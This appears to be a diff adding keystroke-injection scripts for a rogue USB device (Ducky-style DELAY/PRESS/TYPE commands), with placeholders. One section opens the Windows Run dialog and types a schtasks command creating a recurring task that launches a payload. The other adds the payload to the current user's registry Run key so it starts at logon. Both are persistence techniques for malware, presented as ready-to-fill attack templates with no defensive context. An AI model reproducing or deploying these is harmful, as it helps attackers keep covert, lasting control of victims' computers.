@@ -1,0 +1,15 @@
+## SCHEDULED TASKS ##
+
+DELAY(10000);
+PRESS("GUI R");
+DELAY(1000);
+TYPE("schtasks /create /sc minute /mo <time in minutes after which the task would be executed> /tn "<scheduled task name>" /tr <path to payload.ext>");
+PRESS("ENTER");
+
+## USERLAND REGISTRY MODIFICATION ##
+
+DELAY(10000);
+PRESS("GUI R");
+DELAY(1000);
+TYPE("reg add \" HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"  /v <registry key name> /t REG_SZ /d \" <path to payload.ext>\" ");
+PRESS("ENTER");
